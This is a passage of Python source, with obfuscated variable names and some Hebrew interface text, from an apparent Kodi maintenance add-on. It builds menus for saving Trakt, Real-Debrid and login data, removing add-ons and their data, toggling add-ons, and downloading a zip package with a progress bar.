	addFile ('%s שמירת הגדרות בסקין :צבעים\תצוגות מדיה  : '%O0OOO00O000OOOOOO .replace ('true',O0OO0O0000OO0O0O0 ).replace ('false',OOOO0O0000000O000 ),'togglesetting','keepview',icon =ICONTRAKT ,themeit =THEME1 )#line:3166
	addFile ('%s שמירת פליליסט לאודר:  '%OO0OO00O000O0OO0O .replace ('true',O0OO0O0000OO0O0O0 ).replace ('false',OOOO0O0000000O000 ),'togglesetting','keepplaylist',icon =ICONTRAKT ,themeit =THEME1 )#line:3167
	addFile ('%s שמירת הגדרות באפר: '%OOO00OO00000OOO0O .replace ('true',O0OO0O0000OO0O0O0 ).replace ('false',OOOO0O0000000O000 ),'togglesetting','keepadvanced',icon =ICONSAVE ,themeit =THEME1 )#line:3172
	addFile ('%s שמירת רשימות ריפו:  '%OO0OO00O000OOO0O0 .replace ('true',O0OO0O0000OO0O0O0 ).replace ('false',OOOO0O0000000O000 ),'togglesetting','keeprepos',icon =ICONSAVE ,themeit =THEME1 )#line:3174
	setView ('files','viewType')#line:3176
def traktMenu ():#line:3178
	O0OO0O0OO0OO0O0OO ='[COLOR green]מופעל[/COLOR]'if KEEPTRAKT =='true'else '[COLOR red]מבוטל[/COLOR]'#line:3179
	O00O0O0O00000O0OO =str (TRAKTSAVE )if not TRAKTSAVE ==''else 'Trakt hasnt been saved yet.'#line:3180
	addFile ('[I]Register FREE Account at http://trakt.tv[/I]','',icon =ICONTRAKT ,themeit =THEME3 )#line:3181
	addFile ('Save Trakt Data: %s'%O0OO0O0OO0OO0O0OO ,'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME3 )#line:3182
	if KEEPTRAKT =='true':addFile ('Last Save: %s'%str (O00O0O0O00000O0OO ),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3183
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3184
	for O0OO0O0OO0OO0O0OO in traktit .ORDER :#line:3186
		O0000OOO0O00O00O0 =TRAKTID [O0OO0O0OO0OO0O0OO ]['name']#line:3187
		O0OOOO0O000OO0OOO =TRAKTID [O0OO0O0OO0OO0O0OO ]['path']#line:3188
		OO000OOO00O00OOOO =TRAKTID [O0OO0O0OO0OO0O0OO ]['saved']#line:3189
		O000OOO0000000OO0 =TRAKTID [O0OO0O0OO0OO0O0OO ]['file']#line:3190
		O00O0000OO0OOOO0O =wiz .getS (OO000OOO00O00OOOO )#line:3191
		OOO000OOO0OOOOO00 =traktit .traktUser (O0OO0O0OO0OO0O0OO )#line:3192
		OO00OO0O0OOO0OO0O =TRAKTID [O0OO0O0OO0OO0O0OO ]['icon']if os .path .exists (O0OOOO0O000OO0OOO )else ICONTRAKT #line:3193
		OOO0000O0OOOOO00O =TRAKTID [O0OO0O0OO0OO0O0OO ]['fanart']if os .path .exists (O0OOOO0O000OO0OOO )else FANART #line:3194
		O00O0O0OOO0000O0O =createMenu ('saveaddon','Trakt',O0OO0O0OO0OO0O0OO )#line:3195
		OOO000O00OOOOO0OO =createMenu ('save','Trakt',O0OO0O0OO0OO0O0OO )#line:3196
		O00O0O0OOO0000O0O .append ((THEME2 %'%s Settings'%O0000OOO0O00O00O0 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=trakt)'%(ADDON_ID ,O0OO0O0OO0OO0O0OO )))#line:3197
		addFile ('[+]-> %s'%O0000OOO0O00O00O0 ,'',icon =OO00OO0O0OOO0OO0O ,fanart =OOO0000O0OOOOO00O ,themeit =THEME3 )#line:3199
		if not os .path .exists (O0OOOO0O000OO0OOO ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OO00OO0O0OOO0OO0O ,fanart =OOO0000O0OOOOO00O ,menu =O00O0O0OOO0000O0O )#line:3200
		elif not OOO000OOO0OOOOO00 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authtrakt',O0OO0O0OO0OO0O0OO ,icon =OO00OO0O0OOO0OO0O ,fanart =OOO0000O0OOOOO00O ,menu =O00O0O0OOO0000O0O )#line:3201
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OOO000OOO0OOOOO00 ,'authtrakt',O0OO0O0OO0OO0O0OO ,icon =OO00OO0O0OOO0OO0O ,fanart =OOO0000O0OOOOO00O ,menu =O00O0O0OOO0000O0O )#line:3202
		if O00O0000OO0OOOO0O =="":#line:3203
			if os .path .exists (O000OOO0000000OO0 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importtrakt',O0OO0O0OO0OO0O0OO ,icon =OO00OO0O0OOO0OO0O ,fanart =OOO0000O0OOOOO00O ,menu =OOO000O00OOOOO0OO )#line:3204
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savetrakt',O0OO0O0OO0OO0O0OO ,icon =OO00OO0O0OOO0OO0O ,fanart =OOO0000O0OOOOO00O ,menu =OOO000O00OOOOO0OO )#line:3205
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O00O0000OO0OOOO0O ,'',icon =OO00OO0O0OOO0OO0O ,fanart =OOO0000O0OOOOO00O ,menu =OOO000O00OOOOO0OO )#line:3206
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3208
	addFile ('Save All Trakt Data','savetrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3209
	addFile ('Recover All Saved Trakt Data','restoretrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3210
	addFile ('Import Trakt Data','importtrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3211
	addFile ('Clear All Saved Trakt Data','cleartrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3212
	addFile ('Clear All Addon Data','addontrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3213
	setView ('files','viewType')#line:3214
def realMenu ():#line:3216
	OO0O0OOO00O0OO000 ='[COLOR green]ON[/COLOR]'if KEEPREAL =='true'else '[COLOR red]OFF[/COLOR]'#line:3217
	O000OOO00OOO0OO00 =str (REALSAVE )if not REALSAVE ==''else 'Real Debrid hasnt been saved yet.'#line:3218
	addFile ('[I]http://real-debrid.com is a PAID service.[/I]','',icon =ICONREAL ,themeit =THEME3 )#line:3219
	addFile ('Save Real Debrid Data: %s'%OO0O0OOO00O0OO000 ,'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME3 )#line:3220
	if KEEPREAL =='true':addFile ('Last Save: %s'%str (O000OOO00OOO0OO00 ),'',icon =ICONREAL ,themeit =THEME3 )#line:3221
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONREAL ,themeit =THEME3 )#line:3222
	for OOOOOOOO00000O00O in debridit .ORDER :#line:3224
		O0OO00O000O0O0O00 =DEBRIDID [OOOOOOOO00000O00O ]['name']#line:3225
		OOOOOOOOO0OOO000O =DEBRIDID [OOOOOOOO00000O00O ]['path']#line:3226
		OO0OO0O0O000O0O0O =DEBRIDID [OOOOOOOO00000O00O ]['saved']#line:3227
		O0O0O0OO00OO00OO0 =DEBRIDID [OOOOOOOO00000O00O ]['file']#line:3228
		OOOOOOO0O00O0OO0O =wiz .getS (OO0OO0O0O000O0O0O )#line:3229
		O000O0OO0O000OO00 =debridit .debridUser (OOOOOOOO00000O00O )#line:3230
		O0O0O0O00O0OO00OO =DEBRIDID [OOOOOOOO00000O00O ]['icon']if os .path .exists (OOOOOOOOO0OOO000O )else ICONREAL #line:3231
		OOO0OOOO0OOOO00O0 =DEBRIDID [OOOOOOOO00000O00O ]['fanart']if os .path .exists (OOOOOOOOO0OOO000O )else FANART #line:3232
		O0OOO00O000O00000 =createMenu ('saveaddon','Debrid',OOOOOOOO00000O00O )#line:3233
		O0OOO0O00O0000000 =createMenu ('save','Debrid',OOOOOOOO00000O00O )#line:3234
		O0OOO00O000O00000 .append ((THEME2 %'%s Settings'%O0OO00O000O0O0O00 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=debrid)'%(ADDON_ID ,OOOOOOOO00000O00O )))#line:3235
		addFile ('[+]-> %s'%O0OO00O000O0O0O00 ,'',icon =O0O0O0O00O0OO00OO ,fanart =OOO0OOOO0OOOO00O0 ,themeit =THEME3 )#line:3237
		if not os .path .exists (OOOOOOOOO0OOO000O ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O0O0O0O00O0OO00OO ,fanart =OOO0OOOO0OOOO00O0 ,menu =O0OOO00O000O00000 )#line:3238
		elif not O000O0OO0O000OO00 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authdebrid',OOOOOOOO00000O00O ,icon =O0O0O0O00O0OO00OO ,fanart =OOO0OOOO0OOOO00O0 ,menu =O0OOO00O000O00000 )#line:3239
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O000O0OO0O000OO00 ,'authdebrid',OOOOOOOO00000O00O ,icon =O0O0O0O00O0OO00OO ,fanart =OOO0OOOO0OOOO00O0 ,menu =O0OOO00O000O00000 )#line:3240
		if OOOOOOO0O00O0OO0O =="":#line:3241
			if os .path .exists (O0O0O0OO00OO00OO0 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importdebrid',OOOOOOOO00000O00O ,icon =O0O0O0O00O0OO00OO ,fanart =OOO0OOOO0OOOO00O0 ,menu =O0OOO0O00O0000000 )#line:3242
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savedebrid',OOOOOOOO00000O00O ,icon =O0O0O0O00O0OO00OO ,fanart =OOO0OOOO0OOOO00O0 ,menu =O0OOO0O00O0000000 )#line:3243
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OOOOOOO0O00O0OO0O ,'',icon =O0O0O0O00O0OO00OO ,fanart =OOO0OOOO0OOOO00O0 ,menu =O0OOO0O00O0000000 )#line:3244
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3246
	addFile ('Save All Real Debrid Data','savedebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3247
	addFile ('Recover All Saved Real Debrid Data','restoredebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3248
	addFile ('Import Real Debrid Data','importdebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3249
	addFile ('Clear All Saved Real Debrid Data','cleardebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3250
	addFile ('Clear All Addon Data','addondebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3251
	setView ('files','viewType')#line:3252
def loginMenu ():#line:3254
	O00000OOOO0OOO0O0 ='[COLOR green]ON[/COLOR]'if KEEPLOGIN =='true'else '[COLOR red]OFF[/COLOR]'#line:3255
	O0OOOO0OOOO0O00O0 =str (LOGINSAVE )if not LOGINSAVE ==''else 'Login data hasnt been saved yet.'#line:3256
	addFile ('[I]Several of these addons are PAID services.[/I]','',icon =ICONLOGIN ,themeit =THEME3 )#line:3257
	addFile ('Save Login Data: %s'%O00000OOOO0OOO0O0 ,'togglesetting','keeplogin',icon =ICONLOGIN ,themeit =THEME3 )#line:3258
	if KEEPLOGIN =='true':addFile ('Last Save: %s'%str (O0OOOO0OOOO0O00O0 ),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3259
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3260
	for O00000OOOO0OOO0O0 in loginit .ORDER :#line:3262
		OO0OOOO00OOOOO00O =LOGINID [O00000OOOO0OOO0O0 ]['name']#line:3263
		OOO000OO0O00O00OO =LOGINID [O00000OOOO0OOO0O0 ]['path']#line:3264
		O000O0000000OO00O =LOGINID [O00000OOOO0OOO0O0 ]['saved']#line:3265
		OOOO000O0OO0O0OO0 =LOGINID [O00000OOOO0OOO0O0 ]['file']#line:3266
		O0OOO00O000O0O0OO =wiz .getS (O000O0000000OO00O )#line:3267
		O000OOO00OO0OO0OO =loginit .loginUser (O00000OOOO0OOO0O0 )#line:3268
		OO00O0O0OO0O00O0O =LOGINID [O00000OOOO0OOO0O0 ]['icon']if os .path .exists (OOO000OO0O00O00OO )else ICONLOGIN #line:3269
		O0OO0O0OO00OO0O0O =LOGINID [O00000OOOO0OOO0O0 ]['fanart']if os .path .exists (OOO000OO0O00O00OO )else FANART #line:3270
		O0OO00000OOOOOOOO =createMenu ('saveaddon','Login',O00000OOOO0OOO0O0 )#line:3271
		O00O0OOO0OO0OO0O0 =createMenu ('save','Login',O00000OOOO0OOO0O0 )#line:3272
		O0OO00000OOOOOOOO .append ((THEME2 %'%s Settings'%OO0OOOO00OOOOO00O ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=login)'%(ADDON_ID ,O00000OOOO0OOO0O0 )))#line:3273
		addFile ('[+]-> %s'%OO0OOOO00OOOOO00O ,'',icon =OO00O0O0OO0O00O0O ,fanart =O0OO0O0OO00OO0O0O ,themeit =THEME3 )#line:3275
		if not os .path .exists (OOO000OO0O00O00OO ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OO00O0O0OO0O00O0O ,fanart =O0OO0O0OO00OO0O0O ,menu =O0OO00000OOOOOOOO )#line:3276
		elif not O000OOO00OO0OO0OO :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authlogin',O00000OOOO0OOO0O0 ,icon =OO00O0O0OO0O00O0O ,fanart =O0OO0O0OO00OO0O0O ,menu =O0OO00000OOOOOOOO )#line:3277
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O000OOO00OO0OO0OO ,'authlogin',O00000OOOO0OOO0O0 ,icon =OO00O0O0OO0O00O0O ,fanart =O0OO0O0OO00OO0O0O ,menu =O0OO00000OOOOOOOO )#line:3278
		if O0OOO00O000O0O0OO =="":#line:3279
			if os .path .exists (OOOO000O0OO0O0OO0 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importlogin',O00000OOOO0OOO0O0 ,icon =OO00O0O0OO0O00O0O ,fanart =O0OO0O0OO00OO0O0O ,menu =O00O0OOO0OO0OO0O0 )#line:3280
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savelogin',O00000OOOO0OOO0O0 ,icon =OO00O0O0OO0O00O0O ,fanart =O0OO0O0OO00OO0O0O ,menu =O00O0OOO0OO0OO0O0 )#line:3281
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O0OOO00O000O0O0OO ,'',icon =OO00O0O0OO0O00O0O ,fanart =O0OO0O0OO00OO0O0O ,menu =O00O0OOO0OO0OO0O0 )#line:3282
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3284
	addFile ('Save All Login Data','savelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3285
	addFile ('Recover All Saved Login Data','restorelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3286
	addFile ('Import Login Data','importlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3287
	addFile ('Clear All Saved Login Data','clearlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3288
	addFile ('Clear All Addon Data','addonlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3289
	setView ('files','viewType')#line:3290
def fixUpdate ():#line:3292
	if KODIV <17 :#line:3293
		O0O0OO0O00O00O0OO =os .path .join (DATABASE ,wiz .latestDB ('Addons'))#line:3294
		try :#line:3295
			os .remove (O0O0OO0O00O00O0OO )#line:3296
		except Exception as OO00O0O0000O000O0 :#line:3297
			wiz .log ("Unable to remove %s, Purging DB"%O0O0OO0O00O00O0OO )#line:3298
			wiz .purgeDb (O0O0OO0O00O00O0OO )#line:3299
	else :#line:3300
		xbmc .log ("Requested Addons.db be removed but doesnt work in Kod17")#line:3301
def removeAddonMenu ():#line:3303
	O000O0OOO0OOO0O0O =glob .glob (os .path .join (ADDONS ,'*/'))#line:3304
	OOO0OO00O000OO00O =[];O000O00OOOOOOOOO0 =[]#line:3305
	for OO00O000OO00OOOOO in sorted (O000O0OOO0OOO0O0O ,key =lambda OOOO0O000O0O0OO0O :OOOO0O000O0O0OO0O ):#line:3306
		OO00O000OOO0O000O =os .path .split (OO00O000OO00OOOOO [:-1 ])[1 ]#line:3307
		if OO00O000OOO0O000O in EXCLUDES :continue #line:3308
		elif OO00O000OOO0O000O in DEFAULTPLUGINS :continue #line:3309
		elif OO00O000OOO0O000O =='packages':continue #line:3310
		O00000O000O00OO0O =os .path .join (OO00O000OO00OOOOO ,'addon.xml')#line:3311
		if os .path .exists (O00000O000O00OO0O ):#line:3312
			O000000OO00O0OOO0 =open (O00000O000O00OO0O )#line:3313
			O0OO0OOO0OOOOOOOO =O000000OO00O0OOO0 .read ()#line:3314
			O000O00OOO000OOOO =wiz .parseDOM (O0OO0OOO0OOOOOOOO ,'addon',ret ='id')#line:3315
			OO000O0O00OO00000 =OO00O000OOO0O000O if len (O000O00OOO000OOOO )==0 else O000O00OOO000OOOO [0 ]#line:3317
			try :#line:3318
				O00O000OOOO000O00 =xbmcaddon .Addon (id =OO000O0O00OO00000 )#line:3319
				OOO0OO00O000OO00O .append (O00O000OOOO000O00 .getAddonInfo ('name'))#line:3320
				O000O00OOOOOOOOO0 .append (OO000O0O00OO00000 )#line:3321
			except :#line:3322
				pass #line:3323
	if len (OOO0OO00O000OO00O )==0 :#line:3324
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Addons To Remove[/COLOR]"%COLOR2 )#line:3325
		return #line:3326
	if KODIV >16 :#line:3327
		OO00000OO00O00OOO =DIALOG .multiselect ("%s: Select the addons you wish to remove."%ADDONTITLE ,OOO0OO00O000OO00O )#line:3328
	else :#line:3329
		OO00000OO00O00OOO =[];OOO00O0OO00OOOOOO =0 #line:3330
		OO00OOOOO0OOOO0O0 =["-- Click here to Continue --"]+OOO0OO00O000OO00O #line:3331
		while not OOO00O0OO00OOOOOO ==-1 :#line:3332
			OOO00O0OO00OOOOOO =DIALOG .select ("%s: Select the addons you wish to remove."%ADDONTITLE ,OO00OOOOO0OOOO0O0 )#line:3333
			if OOO00O0OO00OOOOOO ==-1 :break #line:3334
			elif OOO00O0OO00OOOOOO ==0 :break #line:3335
			else :#line:3336
				OO0OO000O00OOO0O0 =(OOO00O0OO00OOOOOO -1 )#line:3337
				if OO0OO000O00OOO0O0 in OO00000OO00O00OOO :#line:3338
					OO00000OO00O00OOO .remove (OO0OO000O00OOO0O0 )#line:3339
					OO00OOOOO0OOOO0O0 [OOO00O0OO00OOOOOO ]=OOO0OO00O000OO00O [OO0OO000O00OOO0O0 ]#line:3340
				else :#line:3341
					OO00000OO00O00OOO .append (OO0OO000O00OOO0O0 )#line:3342
					OO00OOOOO0OOOO0O0 [OOO00O0OO00OOOOOO ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,OOO0OO00O000OO00O [OO0OO000O00OOO0O0 ])#line:3343
	if OO00000OO00O00OOO ==None :return #line:3344
	if len (OO00000OO00O00OOO )>0 :#line:3345
		wiz .addonUpdates ('set')#line:3346
		for O0O000O0O0O0O00O0 in OO00000OO00O00OOO :#line:3347
			removeAddon (O000O00OOOOOOOOO0 [O0O000O0O0O0O00O0 ],OOO0OO00O000OO00O [O0O000O0O0O0O00O0 ],True )#line:3348
		xbmc .sleep (1000 )#line:3350
		if INSTALLMETHOD ==1 :O0OO00O0O0000OOOO =1 #line:3352
		elif INSTALLMETHOD ==2 :O0OO00O0O0000OOOO =0 #line:3353
		else :O0OO00O0O0000OOOO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצג נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]הצג נתונים[/COLOR][/B]",nolabel ="[B][COLOR red]סגירה[/COLOR][/B]")#line:3354
		if O0OO00O0O0000OOOO ==1 :wiz .reloadFix ('remove addon')#line:3355
		else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:3356
def removeAddonDataMenu ():#line:3358
	if os .path .exists (ADDOND ):#line:3359
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data','removedata','all',themeit =THEME2 )#line:3360
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data for Uninstalled Addons','removedata','uninstalled',themeit =THEME2 )#line:3361
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Empty Folders in Addon_Data','removedata','empty',themeit =THEME2 )#line:3362
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] %s Addon_Data'%ADDONTITLE ,'resetaddon',themeit =THEME2 )#line:3363
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3364
		OOOOOO0000O000OO0 =glob .glob (os .path .join (ADDOND ,'*/'))#line:3365
		for O0O0OO0O000OO000O in sorted (OOOOOO0000O000OO0 ,key =lambda O0O0O0OO0O00OOOOO :O0O0O0OO0O00OOOOO ):#line:3366
			OOO0OOO0O0O0OO0OO =O0O0OO0O000OO000O .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:3367
			OO000OOOOOO0O00OO =os .path .join (O0O0OO0O000OO000O .replace (ADDOND ,ADDONS ),'icon.png')#line:3368
			O0O0OOO0OO000O00O =os .path .join (O0O0OO0O000OO000O .replace (ADDOND ,ADDONS ),'fanart.png')#line:3369
			O0O00OO00O0O0OO00 =OOO0OOO0O0O0OO0OO #line:3370
			O0OOO000OO0OOOO0O ={'audio.':'[COLOR orange][AUDIO] [/COLOR]','metadata.':'[COLOR cyan][METADATA] [/COLOR]','module.':'[COLOR orange][MODULE] [/COLOR]','plugin.':'[COLOR blue][PLUGIN] [/COLOR]','program.':'[COLOR orange][PROGRAM] [/COLOR]','repository.':'[COLOR gold][REPO] [/COLOR]','script.':'[COLOR green][SCRIPT] [/COLOR]','service.':'[COLOR green][SERVICE] [/COLOR]','skin.':'[COLOR dodgerblue][SKIN] [/COLOR]','video.':'[COLOR orange][VIDEO] [/COLOR]','weather.':'[COLOR yellow][WEATHER] [/COLOR]'}#line:3371
			for OOO0O0OO000O0OO00 in O0OOO000OO0OOOO0O :#line:3372
				O0O00OO00O0O0OO00 =O0O00OO00O0O0OO00 .replace (OOO0O0OO000O0OO00 ,O0OOO000OO0OOOO0O [OOO0O0OO000O0OO00 ])#line:3373
			if OOO0OOO0O0O0OO0OO in EXCLUDES :O0O00OO00O0O0OO00 ='[COLOR green][B][PROTECTED][/B][/COLOR] %s'%O0O00OO00O0O0OO00 #line:3374
			else :O0O00OO00O0O0OO00 ='[COLOR red][B][REMOVE][/B][/COLOR] %s'%O0O00OO00O0O0OO00 #line:3375
			addFile (' %s'%O0O00OO00O0O0OO00 ,'removedata',OOO0OOO0O0O0OO0OO ,icon =OO000OOOOOO0O00OO ,fanart =O0O0OOO0OO000O00O ,themeit =THEME2 )#line:3376
	else :#line:3377
		addFile ('No Addon data folder found.','',themeit =THEME3 )#line:3378
	setView ('files','viewType')#line:3379
def enableAddons ():#line:3381
	addFile ("[I][B][COLOR red]!!Notice: Disabling Some Addons Can Cause Issues!![/COLOR][/B][/I]",'',icon =ICONMAINT )#line:3382
	OO0000O0OOO0OO0OO =glob .glob (os .path .join (ADDONS ,'*/'))#line:3383
	OO00OO00O000O00O0 =0 #line:3384
	for O00O0O0OOO0OO0000 in sorted (OO0000O0OOO0OO0OO ,key =lambda O000OO0OOOO000OOO :O000OO0OOOO000OOO ):#line:3385
		O0000O0OO0OOOO0O0 =os .path .split (O00O0O0OOO0OO0000 [:-1 ])[1 ]#line:3386
		if O0000O0OO0OOOO0O0 in EXCLUDES :continue #line:3387
		if O0000O0OO0OOOO0O0 in DEFAULTPLUGINS :continue #line:3388
		O0O000O000O0O000O =os .path .join (O00O0O0OOO0OO0000 ,'addon.xml')#line:3389
		if os .path .exists (O0O000O000O0O000O ):#line:3390
			OO00OO00O000O00O0 +=1 #line:3391
			OO0000O0OOO0OO0OO =O00O0O0OOO0OO0000 .replace (ADDONS ,'')[1 :-1 ]#line:3392
			OOO0O0OO00OO00000 =open (O0O000O000O0O000O )#line:3393
			O0O0O000O00O0000O =OOO0O0OO00OO00000 .read ().replace ('\n','').replace ('\r','').replace ('\t','')#line:3394
			O0OOOO00O0000O00O =wiz .parseDOM (O0O0O000O00O0000O ,'addon',ret ='id')#line:3395
			O000O00O000O0OO0O =wiz .parseDOM (O0O0O000O00O0000O ,'addon',ret ='name')#line:3396
			try :#line:3397
				OO0OOO00OOOO00000 =O0OOOO00O0000O00O [0 ]#line:3398
				O00OOOOOO0O000O0O =O000O00O000O0OO0O [0 ]#line:3399
			except :#line:3400
				continue #line:3401
			try :#line:3402
				O00OO000O00O000O0 =xbmcaddon .Addon (id =OO0OOO00OOOO00000 )#line:3403
				OOOOO000OO0O000O0 ="[COLOR green][Enabled][/COLOR]"#line:3404
				O00OOO000O00OO0OO ="false"#line:3405
			except :#line:3406
				OOOOO000OO0O000O0 ="[COLOR red][Disabled][/COLOR]"#line:3407
				O00OOO000O00OO0OO ="true"#line:3408
				pass #line:3409
			OOO0OOOOO00000O0O =os .path .join (O00O0O0OOO0OO0000 ,'icon.png')if os .path .exists (os .path .join (O00O0O0OOO0OO0000 ,'icon.png'))else ICON #line:3410
			OOOOOO0OOOO0OO000 =os .path .join (O00O0O0OOO0OO0000 ,'fanart.jpg')if os .path .exists (os .path .join (O00O0O0OOO0OO0000 ,'fanart.jpg'))else FANART #line:3411
			addFile ("%s %s"%(OOOOO000OO0O000O0 ,O00OOOOOO0O000O0O ),'toggleaddon',OO0000O0OOO0OO0OO ,O00OOO000O00OO0OO ,icon =OOO0OOOOO00000O0O ,fanart =OOOOOO0OOOO0OO000 )#line:3412
			OOO0O0OO00OO00000 .close ()#line:3413
	if OO00OO00O000O00O0 ==0 :#line:3414
		addFile ("No Addons Found to Enable or Disable.",'',icon =ICONMAINT )#line:3415
	setView ('files','viewType')#line:3416
def changeFeq ():#line:3418
	OOO000OO000OO00O0 =['Every Startup','Every Day','Every Three Days','Every Weekly']#line:3419
	O00OOO000OOOOOOOO =DIALOG .select ("[COLOR %s]How often would you list to Auto Clean on Startup?[/COLOR]"%COLOR2 ,OOO000OO000OO00O0 )#line:3420
	if not O00OOO000OOOOOOOO ==-1 :#line:3421
		wiz .setS ('autocleanfeq',str (O00OOO000OOOOOOOO ))#line:3422
		wiz .LogNotify ('[COLOR %s]Auto Clean Up[/COLOR]'%COLOR1 ,'[COLOR %s]Fequency Now %s[/COLOR]'%(COLOR2 ,OOO000OO000OO00O0 [O00OOO000OOOOOOOO ]))#line:3423
def developer ():#line:3425
	addFile ('Convert Text Files to 0.1.7','converttext',themeit =THEME1 )#line:3426
	addFile ('Create QR Code','createqr',themeit =THEME1 )#line:3427
	addFile ('Test Notifications','testnotify',themeit =THEME1 )#line:3428
	addFile ('Test Update','testupdate',themeit =THEME1 )#line:3429
	addFile ('Test First Run','testfirst',themeit =THEME1 )#line:3430
	addFile ('Test First Run Settings','testfirstrun',themeit =THEME1 )#line:3431
	addFile ('Test APk','testapk',themeit =THEME1 )#line:3432
	setView ('files','viewType')#line:3434
def download (OOO0OOOO0OO0OOOO0 ,OO0O000O0OOO0OOO0 ):#line:3439
  O0OOO0O00OOOOO000 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:3440
  O00OOOO0O0O0000OO =xbmcgui .DialogProgress ()#line:3441
  O00OOOO0O0O0000OO .create ("XBMC ISRAEL","Downloading "+name ,'','Please Wait')#line:3442
  OO0OOOOO0OOOOO00O =os .path .join (O0OOO0O00OOOOO000 ,'isr.zip')#line:3443
  O00OOO0OOO0O0O00O =urllib2 .Request (OOO0OOOO0OO0OOOO0 )#line:3444
  O0OOO0O0000O00O00 =urllib2 .urlopen (O00OOO0OOO0O0O00O )#line:3445
  OOO0O000OOO0O0OOO =xbmcgui .DialogProgress ()#line:3447
  OOO0O000OOO0O0OOO .create ("Downloading","Downloading "+name )#line:3448
  OOO0O000OOO0O0OOO .update (0 )#line:3449
  O0OO0000OOOOOOOO0 =OO0O000O0OOO0OOO0 #line:3450
  O0O0OO00O00000000 =open (OO0OOOOO0OOOOO00O ,'wb')#line:3451
  try :#line:3453
    OOOOO0OOOOOOOOOOO =O0OOO0O0000O00O00 .info ().getheader ('Content-Length').strip ()#line:3454
    O0O0O0OO0O000OO00 =True #line:3455
  except AttributeError :#line:3456
        O0O0O0OO0O000OO00 =False #line:3457
  if O0O0O0OO0O000OO00 :#line:3459
        OOOOO0OOOOOOOOOOO =int (OOOOO0OOOOOOOOOOO )#line:3460
  OOOO0OOO0O0O0O0OO =0 #line:3462
  O0O0O0O0O0O0O0OOO =time .time ()#line:3463
  while True :#line:3464
        O0O00O0OO00O00OO0 =O0OOO0O0000O00O00 .read (8192 )#line:3465
        if not O0O00O0OO00O00OO0 :#line:3466
            sys .stdout .write ('\n')#line:3467
            break #line:3468
        OOOO0OOO0O0O0O0OO +=len (O0O00O0OO00O00OO0 )#line:3470
        O0O0OO00O00000000 .write (O0O00O0OO00O00OO0 )#line:3471
        if not O0O0O0OO0O000OO00 :#line:3473
            OOOOO0OOOOOOOOOOO =OOOO0OOO0O0O0O0OO #line:3474
        if OOO0O000OOO0O0OOO .iscanceled ():#line:3475
           OOO0O000OOO0O0OOO .close ()#line:3476
           try :#line:3477
            os .remove (OO0OOOOO0OOOOO00O )#line:3478
           except :#line:3479
            pass #line:3480
           break #line:3481
        OO0O0OOO00O00OOOO =float (OOOO0OOO0O0O0O0OO )/OOOOO0OOOOOOOOOOO #line:3482
        OO0O0OOO00O00OOOO =round (OO0O0OOO00O00OOOO *100 ,2 )#line:3483
